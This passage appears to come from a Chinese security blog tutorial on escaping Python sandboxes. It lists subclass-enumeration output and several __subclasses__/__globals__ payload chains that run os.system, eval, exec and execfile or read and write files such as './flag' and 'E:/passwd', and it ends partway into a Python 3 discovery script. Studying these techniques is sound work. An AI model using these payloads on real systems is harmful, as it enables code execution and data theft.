class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line">----------1-----------</span><br><span class="line">(40, &apos;file&apos;)</span><br><span class="line">----------2-----------</span><br><span class="line">(59, &lt;class &apos;warnings.WarningMessage&apos;&gt;, &apos;linecache&apos;, [&apos;os&apos;, &apos;sys&apos;, &apos;__builtins__&apos;])</span><br><span class="line">(59, &lt;class &apos;warnings.WarningMessage&apos;&gt;, &apos;__builtins__&apos;, None)</span><br><span class="line">(59, &lt;class &apos;warnings.WarningMessage&apos;&gt;, &apos;sys&apos;, None)</span><br><span class="line">(59, &lt;class &apos;warnings.WarningMessage&apos;&gt;, &apos;types&apos;, [&apos;__builtins__&apos;])</span><br><span class="line">(60, &lt;class &apos;warnings.catch_warnings&apos;&gt;, &apos;linecache&apos;, [&apos;os&apos;, &apos;sys&apos;, &apos;__builtins__&apos;])</span><br><span class="line">(60, &lt;class &apos;warnings.catch_warnings&apos;&gt;, &apos;__builtins__&apos;, None)</span><br><span class="line">(60, &lt;class &apos;warnings.catch_warnings&apos;&gt;, &apos;sys&apos;, None)</span><br><span class="line">(60, &lt;class &apos;warnings.catch_warnings&apos;&gt;, &apos;types&apos;, [&apos;__builtins__&apos;])</span><br><span class="line">(61, &lt;class &apos;_weakrefset._IterationGuard&apos;&gt;, &apos;__builtins__&apos;, None)</span><br><span class="line">(62, &lt;class &apos;_weakrefset.WeakSet&apos;&gt;, &apos;__builtins__&apos;, None)</span><br><span class="line">(72, &lt;class &apos;site._Printer&apos;&gt;, &apos;__builtins__&apos;, None)</span><br><span class="line">(72, &lt;class &apos;site._Printer&apos;&gt;, &apos;os&apos;, [&apos;sys&apos;, &apos;__builtins__&apos;, &apos;open&apos;])</span><br><span class="line">(72, &lt;class &apos;site._Printer&apos;&gt;, &apos;sys&apos;, None)</span><br><span class="line">(74, &lt;class &apos;site.Quitter&apos;&gt;, &apos;__builtins__&apos;, None)</span><br><span class="line">(74, &lt;class &apos;site.Quitter&apos;&gt;, &apos;os&apos;, [&apos;sys&apos;, &apos;__builtins__&apos;, &apos;open&apos;])</span><br><span class="line">(74, &lt;class &apos;site.Quitter&apos;&gt;, &apos;sys&apos;, None)</span><br><span class="line">(75, &lt;class &apos;codecs.IncrementalEncoder&apos;&gt;, &apos;__builtins__&apos;, None)</span><br><span class="line">(75, &lt;class &apos;codecs.IncrementalEncoder&apos;&gt;, &apos;sys&apos;, None)</span><br><span class="line">(75, &lt;class &apos;codecs.IncrementalEncoder&apos;&gt;, &apos;open&apos;, None)</span><br><span class="line">(76, &lt;class &apos;codecs.IncrementalDecoder&apos;&gt;, &apos;__builtins__&apos;, None)</span><br><span class="line">(76, &lt;class &apos;codecs.IncrementalDecoder&apos;&gt;, &apos;sys&apos;, None)</span><br><span class="line">(76, &lt;class &apos;codecs.IncrementalDecoder&apos;&gt;, &apos;open&apos;, None)</span><br><span class="line">----------3-----------</span><br><span class="line">(59, 13, &lt;class &apos;warnings.WarningMessage&apos;&gt;, &apos;__import__&apos;)</span><br><span class="line">(59, 13, &lt;class &apos;warnings.WarningMessage&apos;&gt;, &apos;file&apos;)</span><br><span class="line">(59, 13, &lt;class &apos;warnings.WarningMessage&apos;&gt;, &apos;compile&apos;)</span><br><span class="line">(59, 13, &lt;class &apos;warnings.WarningMessage&apos;&gt;, &apos;eval&apos;)</span><br><span class="line">(59, 13, &lt;class &apos;warnings.WarningMessage&apos;&gt;, &apos;open&apos;)</span><br><span class="line">(59, 13, &lt;class &apos;warnings.WarningMessage&apos;&gt;, &apos;execfile&apos;)</span><br><span class="line">(60, 13, &lt;class &apos;warnings.catch_warnings&apos;&gt;, &apos;__import__&apos;)</span><br><span class="line">(60, 13, &lt;class &apos;warnings.catch_warnings&apos;&gt;, &apos;file&apos;)</span><br><span class="line">(60, 13, &lt;class &apos;warnings.catch_warnings&apos;&gt;, &apos;compile&apos;)</span><br><span class="line">(60, 13, &lt;class &apos;warnings.catch_warnings&apos;&gt;, &apos;eval&apos;)</span><br><span class="line">(60, 13, &lt;class &apos;warnings.catch_warnings&apos;&gt;, &apos;open&apos;)</span><br><span class="line">(60, 13, &lt;class &apos;warnings.catch_warnings&apos;&gt;, &apos;execfile&apos;)</span><br><span class="line">(61, 1, &lt;class &apos;_weakrefset._IterationGuard&apos;&gt;, &apos;__import__&apos;)</span><br><span class="line">(61, 1, &lt;class &apos;_weakrefset._IterationGuard&apos;&gt;, &apos;file&apos;)</span><br><span class="line">(61, 1, &lt;class &apos;_weakrefset._IterationGuard&apos;&gt;, &apos;compile&apos;)</span><br><span class="line">(61, 1, &lt;class &apos;_weakrefset._IterationGuard&apos;&gt;, &apos;eval&apos;)</span><br><span class="line">(61, 1, &lt;class &apos;_weakrefset._IterationGuard&apos;&gt;, &apos;open&apos;)</span><br><span class="line">(61, 1, &lt;class &apos;_weakrefset._IterationGuard&apos;&gt;, &apos;execfile&apos;)</span><br><span class="line">(62, 1, &lt;class &apos;_weakrefset.WeakSet&apos;&gt;, &apos;__import__&apos;)</span><br><span class="line">(62, 1, &lt;class &apos;_weakrefset.WeakSet&apos;&gt;, &apos;file&apos;)</span><br><span class="line">(62, 1, &lt;class &apos;_weakrefset.WeakSet&apos;&gt;, &apos;compile&apos;)</span><br><span class="line">(62, 1, &lt;class &apos;_weakrefset.WeakSet&apos;&gt;, &apos;eval&apos;)</span><br><span class="line">(62, 1, &lt;class &apos;_weakrefset.WeakSet&apos;&gt;, &apos;open&apos;)</span><br><span class="line">(62, 1, &lt;class &apos;_weakrefset.WeakSet&apos;&gt;, &apos;execfile&apos;)</span><br><span class="line">(72, 19, &lt;class &apos;site._Printer&apos;&gt;, &apos;file&apos;)</span><br><span class="line">(72, 19, &lt;class &apos;site._Printer&apos;&gt;, &apos;exec&apos;)</span><br><span class="line">(72, 24, &lt;class &apos;site._Printer&apos;&gt;, &apos;__import__&apos;)</span><br><span class="line">(72, 24, &lt;class &apos;site._Printer&apos;&gt;, &apos;file&apos;)</span><br><span class="line">(72, 24, &lt;class &apos;site._Printer&apos;&gt;, &apos;compile&apos;)</span><br><span class="line">(72, 24, &lt;class &apos;site._Printer&apos;&gt;, &apos;eval&apos;)</span><br><span class="line">(72, 24, &lt;class &apos;site._Printer&apos;&gt;, &apos;open&apos;)</span><br><span class="line">(72, 24, &lt;class &apos;site._Printer&apos;&gt;, &apos;execfile&apos;)</span><br><span class="line">(74, 19, &lt;class &apos;site.Quitter&apos;&gt;, &apos;file&apos;)</span><br><span class="line">(74, 19, &lt;class &apos;site.Quitter&apos;&gt;, &apos;exec&apos;)</span><br><span class="line">(74, 24, &lt;class &apos;site.Quitter&apos;&gt;, &apos;__import__&apos;)</span><br><span class="line">(74, 24, &lt;class &apos;site.Quitter&apos;&gt;, &apos;file&apos;)</span><br><span class="line">(74, 24, &lt;class &apos;site.Quitter&apos;&gt;, &apos;compile&apos;)</span><br><span class="line">(74, 24, &lt;class &apos;site.Quitter&apos;&gt;, &apos;eval&apos;)</span><br><span class="line">(74, 24, &lt;class &apos;site.Quitter&apos;&gt;, &apos;open&apos;)</span><br><span class="line">(74, 24, &lt;class &apos;site.Quitter&apos;&gt;, &apos;execfile&apos;)</span><br><span class="line">(75, 21, &lt;class &apos;codecs.IncrementalEncoder&apos;&gt;, &apos;open&apos;)</span><br><span class="line">(75, 23, &lt;class &apos;codecs.IncrementalEncoder&apos;&gt;, &apos;__import__&apos;)</span><br><span class="line">(75, 23, &lt;class &apos;codecs.IncrementalEncoder&apos;&gt;, &apos;file&apos;)</span><br><span class="line">(75, 23, &lt;class &apos;codecs.IncrementalEncoder&apos;&gt;, &apos;compile&apos;)</span><br><span class="line">(75, 23, &lt;class &apos;codecs.IncrementalEncoder&apos;&gt;, &apos;eval&apos;)</span><br><span class="line">(75, 23, &lt;class &apos;codecs.IncrementalEncoder&apos;&gt;, &apos;open&apos;)</span><br><span class="line">(75, 23, &lt;class &apos;codecs.IncrementalEncoder&apos;&gt;, &apos;execfile&apos;)</span><br><span class="line">(76, 21, &lt;class &apos;codecs.IncrementalDecoder&apos;&gt;, &apos;open&apos;)</span><br><span class="line">(76, 23, &lt;class &apos;codecs.IncrementalDecoder&apos;&gt;, &apos;__import__&apos;)</span><br><span class="line">(76, 23, &lt;class &apos;codecs.IncrementalDecoder&apos;&gt;, &apos;file&apos;)</span><br><span class="line">(76, 23, &lt;class &apos;codecs.IncrementalDecoder&apos;&gt;, &apos;compile&apos;)</span><br><span class="line">(76, 23, &lt;class &apos;codecs.IncrementalDecoder&apos;&gt;, &apos;eval&apos;)</span><br><span class="line">(76, 23, &lt;class &apos;codecs.IncrementalDecoder&apos;&gt;, &apos;open&apos;)</span><br><span class="line">(76, 23, &lt;class &apos;codecs.IncrementalDecoder&apos;&gt;, &apos;execfile&apos;)</span><br><span class="line">----------4-----------</span><br><span class="line">(60, &apos;__import__&apos;)</span><br><span class="line">(60, &apos;file&apos;)</span><br><span class="line">(60, &apos;repr&apos;)</span><br><span class="line">(60, &apos;compile&apos;)</span><br><span class="line">(60, &apos;eval&apos;)</span><br><span class="line">(60, &apos;open&apos;)</span><br><span class="line">(60, &apos;execfile&apos;)</span><br></pre></td></tr></table></figure>

<h5 id="下面简单归纳为4种方式："><a href="#下面简单归纳为4种方式：" class="headerlink" title="下面简单归纳为4种方式："></a>下面简单归纳为4种方式：</h5><h5 id="序号为40，即file-函数，进行文件读取和写入，payload如下："><a href="#序号为40，即file-函数，进行文件读取和写入，payload如下：" class="headerlink" title="序号为40，即file()函数，进行文件读取和写入，payload如下："></a>序号为40，即file()函数，进行文件读取和写入，payload如下：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&apos;&apos;.__class__.__mro__[2].__subclasses__()[40](&apos;./flag&apos;).read()</span><br><span class="line">&apos;&apos;.__class__.__mro__[2].__subclasses__()[40](&apos;./flag&apos;, &apos;w&apos;).write(&apos;ljdd520&apos;)</span><br></pre></td></tr></table></figure>

<h5 id="这和前面元素链构造时给出的Demo有点区别："><a href="#这和前面元素链构造时给出的Demo有点区别：" class="headerlink" title="这和前面元素链构造时给出的Demo有点区别："></a>这和前面元素链构造时给出的Demo有点区别：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;&apos;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&apos;__builtins__&apos;][&apos;file&apos;](&apos;./flag&apos;).read()</span><br></pre></td></tr></table></figure>

<h5 id="序号59是WarningMessage类，其具有globals属性，包含builtins，其中含有file-函数，属于第二种方式；而这里是直接在object类的所有子类中直接找到了file-函数的序号为40，直接调用即可。"><a href="#序号59是WarningMessage类，其具有globals属性，包含builtins，其中含有file-函数，属于第二种方式；而这里是直接在object类的所有子类中直接找到了file-函数的序号为40，直接调用即可。" class="headerlink" title="序号59是WarningMessage类，其具有globals属性，包含builtins，其中含有file()函数，属于第二种方式；而这里是直接在object类的所有子类中直接找到了file()函数的序号为40，直接调用即可。"></a>序号59是WarningMessage类，其具有globals属性，包含builtins，其中含有file()函数，属于第二种方式；而这里是直接在object类的所有子类中直接找到了file()函数的序号为40，直接调用即可。</h5><h5 id="当然也可以通过调用index-函数的方式来寻找file-函数是否在object类的子类中且序号是多少："><a href="#当然也可以通过调用index-函数的方式来寻找file-函数是否在object类的子类中且序号是多少：" class="headerlink" title="当然也可以通过调用index()函数的方式来寻找file()函数是否在object类的子类中且序号是多少："></a>当然也可以通过调用index()函数的方式来寻找file()函数是否在object类的子类中且序号是多少：</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">''</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__().index(file)</span><br><span class="line"><span class="number">40</span></span><br></pre></td></tr></table></figure>

<h4 id="第二种方式："><a href="#第二种方式：" class="headerlink" title="第二种方式："></a>第二种方式：</h4><h5 id="先看序号为59的WarningMessage类有哪些而利用的模块或方法："><a href="#先看序号为59的WarningMessage类有哪些而利用的模块或方法：" class="headerlink" title="先看序号为59的WarningMessage类有哪些而利用的模块或方法："></a>先看序号为59的WarningMessage类有哪些而利用的模块或方法：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(59, &lt;class &apos;warnings.WarningMessage&apos;&gt;, &apos;linecache&apos;, [&apos;os&apos;, &apos;sys&apos;, &apos;__builtins__&apos;])</span><br><span class="line">(59, &lt;class &apos;warnings.WarningMessage&apos;&gt;, &apos;__builtins__&apos;, None)</span><br><span class="line">(59, &lt;class &apos;warnings.WarningMessage&apos;&gt;, &apos;sys&apos;, None)</span><br><span class="line">(59, &lt;class &apos;warnings.WarningMessage&apos;&gt;, &apos;types&apos;, [&apos;__builtins__&apos;])</span><br></pre></td></tr></table></figure>

<h5 id="以linecache中的os为例，这里简单解释下工具的寻找过程依次如下："><a href="#以linecache中的os为例，这里简单解释下工具的寻找过程依次如下：" class="headerlink" title="以linecache中的os为例，这里简单解释下工具的寻找过程依次如下："></a>以linecache中的os为例，这里简单解释下工具的寻找过程依次如下：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># 确认linecache</span><br><span class="line">&apos;&apos;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&apos;linecache&apos;]</span><br><span class="line"># 返回linecache字典中的所有键</span><br><span class="line">&apos;&apos;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&apos;linecache&apos;].__dict__</span><br><span class="line">.keys()</span><br><span class="line"># 在linecache字典的所有键中寻找os的序号，找到为12</span><br><span class="line">&apos;&apos;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&apos;linecache&apos;].__dict__</span><br><span class="line">.keys().index(&apos;os&apos;)</span><br><span class="line"># 更换keys()为values()，访问12序号的元素，并获取该os字典的所有键</span><br><span class="line">&apos;&apos;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&apos;linecache&apos;].__dict__.values()[12].__dict__.keys()</span><br><span class="line"># 在os字典的所有键中寻找system的序号，找到为79</span><br><span class="line">&apos;&apos;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&apos;linecache&apos;].__dict__.values()[12].__dict__.keys().index(&apos;system&apos;)</span><br><span class="line"># 执行os.system()</span><br><span class="line">&apos;&apos;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&apos;linecache&apos;].__dict__.values()[12].__dict__.values()[79](&apos;calc&apos;)</span><br></pre></td></tr></table></figure>

<h5 id="payload如下："><a href="#payload如下：" class="headerlink" title="payload如下："></a>payload如下：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"># linecache利用</span><br><span class="line">&apos;&apos;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&apos;linecache&apos;].__dict__[&apos;os&apos;].system(&apos;calc&apos;)</span><br><span class="line">&apos;&apos;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&apos;linecache&apos;].__dict__[&apos;sys&apos;].modules[&apos;os&apos;].system(&apos;calc&apos;)</span><br><span class="line">&apos;&apos;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&apos;linecache&apos;].__dict__[&apos;__builtins__&apos;][&apos;__import__&apos;](&apos;os&apos;).system(&apos;calc&apos;)</span><br><span class="line"></span><br><span class="line"># __builtins__利用，包括__import__、file、open、execfile、eval、结合exec的compile等</span><br><span class="line">&apos;&apos;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&apos;__builtins__&apos;][&apos;__import__&apos;](&apos;os&apos;).system(&apos;calc&apos;)</span><br><span class="line">&apos;&apos;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&apos;__builtins__&apos;][&apos;file&apos;](&apos;E:/passwd&apos;).read()</span><br><span class="line">&apos;&apos;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&apos;__builtins__&apos;][&apos;open&apos;](&apos;E:/test.txt&apos;, &apos;w&apos;).write(&apos;hello&apos;)</span><br><span class="line">&apos;&apos;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&apos;__builtins__&apos;][&apos;execfile&apos;](&apos;E:/exp.py&apos;)</span><br><span class="line">&apos;&apos;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&apos;__builtins__&apos;][&apos;eval&apos;](&apos;__import__(&quot;os&quot;).system(&quot;calc&quot;)&apos;)</span><br><span class="line">exec(&apos;&apos;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&apos;__builtins__&apos;][&apos;compile&apos;](&apos;__import__(&quot;os&quot;).system(&quot;calc&quot;)&apos;, &apos;&lt;string&gt;&apos;, &apos;exec&apos;))</span><br><span class="line"></span><br><span class="line"># sys利用</span><br><span class="line">&apos;&apos;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&apos;sys&apos;].modules[&apos;os&apos;].system(&apos;calc&apos;)</span><br><span class="line"></span><br><span class="line"># types利用，后面还是通过__builtins__实现利用</span><br><span class="line">&apos;&apos;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&apos;types&apos;].__dict__[&apos;__builtins__&apos;][&apos;__import__&apos;](&apos;os&apos;).system(&apos;calc&apos;)</span><br></pre></td></tr></table></figure>

<h5 id="序号为60的catch-warnings类利用payload同上。"><a href="#序号为60的catch-warnings类利用payload同上。" class="headerlink" title="序号为60的catch_warnings类利用payload同上。"></a>序号为60的catch_warnings类利用payload同上。</h5><h5 id="序号为61、62的两个类均只有-builtins-可利用，利用payload同上。"><a href="#序号为61、62的两个类均只有-builtins-可利用，利用payload同上。" class="headerlink" title="序号为61、62的两个类均只有__builtins__可利用，利用payload同上。"></a>序号为61、62的两个类均只有__builtins__可利用，利用payload同上。</h5><h5 id="序号为72、77的两个类-Printer和Quitter，相比前面的，没见过的有os和traceback，但只有os模块可利用："><a href="#序号为72、77的两个类-Printer和Quitter，相比前面的，没见过的有os和traceback，但只有os模块可利用：" class="headerlink" title="序号为72、77的两个类_Printer和Quitter，相比前面的，没见过的有os和traceback，但只有os模块可利用："></a>序号为72、77的两个类_Printer和Quitter，相比前面的，没见过的有os和traceback，但只有os模块可利用：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># os利用</span><br><span class="line">&apos;&apos;.__class__.__mro__[2].__subclasses__()[72].__init__.__globals__[&apos;os&apos;].system(&apos;calc&apos;)</span><br></pre></td></tr></table></figure>

<h5 id="序号为78、79的两个类IncrementalEncoder和IncrementalDecoder，相比前面的，没见过的有open："><a href="#序号为78、79的两个类IncrementalEncoder和IncrementalDecoder，相比前面的，没见过的有open：" class="headerlink" title="序号为78、79的两个类IncrementalEncoder和IncrementalDecoder，相比前面的，没见过的有open："></a>序号为78、79的两个类IncrementalEncoder和IncrementalDecoder，相比前面的，没见过的有open：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># open利用</span><br><span class="line">&apos;&apos;.__class__.__mro__[2].__subclasses__()[78].__init__.__globals__[&apos;open&apos;](&apos;E:/passwd&apos;).read()</span><br><span class="line">&apos;&apos;.__class__.__mro__[2].__subclasses__()[78].__init__.__globals__[&apos;open&apos;](&apos;E:/test.txt&apos;, &apos;w&apos;).write()</span><br></pre></td></tr></table></figure>

<h4 id="第三种方式："><a href="#第三种方式：" class="headerlink" title="第三种方式："></a>第三种方式：</h4><h5 id="先看下序号为59的WarningMessage类："><a href="#先看下序号为59的WarningMessage类：" class="headerlink" title="先看下序号为59的WarningMessage类："></a>先看下序号为59的WarningMessage类：</h5><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">(59, 13, &lt;class 'warnings.WarningMessage'&gt;, '__import__')</span><br><span class="line">(59, 13, &lt;class 'warnings.WarningMessage'&gt;, 'file')</span><br><span class="line">(59, 13, &lt;class 'warnings.WarningMessage'&gt;, 'compile')</span><br><span class="line">(59, 13, &lt;class 'warnings.WarningMessage'&gt;, 'eval')</span><br><span class="line">(59, 13, &lt;class 'warnings.WarningMessage'&gt;, 'open')</span><br><span class="line">(59, 13, &lt;class 'warnings.WarningMessage'&gt;, 'execfile')</span><br></pre></td></tr></table></figure>

<h5 id="注意是通过values-函数中的数组序号来填写第二个数值实现调用，以下以eval为示例，其他的利用payload和前面的差不多就不再赘述了："><a href="#注意是通过values-函数中的数组序号来填写第二个数值实现调用，以下以eval为示例，其他的利用payload和前面的差不多就不再赘述了：" class="headerlink" title="注意是通过values()函数中的数组序号来填写第二个数值实现调用，以下以eval为示例，其他的利用payload和前面的差不多就不再赘述了："></a>注意是通过values()函数中的数组序号来填写第二个数值实现调用，以下以eval为示例，其他的利用payload和前面的差不多就不再赘述了：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;&apos;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__.values()[13][&apos;eval&apos;](&apos;__import__(&quot;os&quot;).system(&quot;calc&quot;)&apos;)</span><br></pre></td></tr></table></figure>

<h4 id="其他类似修改即可。"><a href="#其他类似修改即可。" class="headerlink" title="其他类似修改即可。"></a>其他类似修改即可。</h4><h4 id="第四种方式"><a href="#第四种方式" class="headerlink" title="第四种方式"></a>第四种方式</h4><h5 id="这里只有一种序号，为60："><a href="#这里只有一种序号，为60：" class="headerlink" title="这里只有一种序号，为60："></a>这里只有一种序号，为60：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">(60, &apos;__import__&apos;)</span><br><span class="line">(60, &apos;file&apos;)</span><br><span class="line">(60, &apos;repr&apos;)</span><br><span class="line">(60, &apos;compile&apos;)</span><br><span class="line">(60, &apos;eval&apos;)</span><br><span class="line">(60, &apos;open&apos;)</span><br><span class="line">(60, &apos;execfile&apos;)</span><br></pre></td></tr></table></figure>

<h5 id="调用示例如下，其他类似修改即可："><a href="#调用示例如下，其他类似修改即可：" class="headerlink" title="调用示例如下，其他类似修改即可："></a>调用示例如下，其他类似修改即可：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;&apos;.__class__.__mro__[2].__subclasses__()[60]()._module.__builtins__[&apos;__import__&apos;](&quot;os&quot;).system(&quot;calc&quot;)</span><br></pre></td></tr></table></figure>

<h5 id="前面的脚本是针对Python2的，这里再贴个Python3的脚本，原理一致："><a href="#前面的脚本是针对Python2的，这里再贴个Python3的脚本，原理一致：" class="headerlink" title="前面的脚本是针对Python2的，这里再贴个Python3的脚本，原理一致："></a>前面的脚本是针对Python2的，这里再贴个Python3的脚本，原理一致：</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=UTF-8</span></span><br><span class="line"><span class="comment"># Python3</span></span><br><span class="line">find_modules = &#123;<span class="string">'asyncio'</span>: [<span class="string">'subprocess'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'collections'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'concurrent'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'ctypes'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'curses'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'dbm'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>, <span class="string">'open'</span>], <span class="string">'distutils'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'email'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'encodings'</span>: [<span class="string">'codecs'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'ensurepip'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'html'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'http'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'idlelib'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'importlib'</span>: [<span class="string">'sys'</span>, <span class="string">'__import__'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'json'</span>: [<span class="string">'codecs'</span>, <span class="string">'__builtins__'</span>], <span class="string">'lib2to3'</span>: [<span 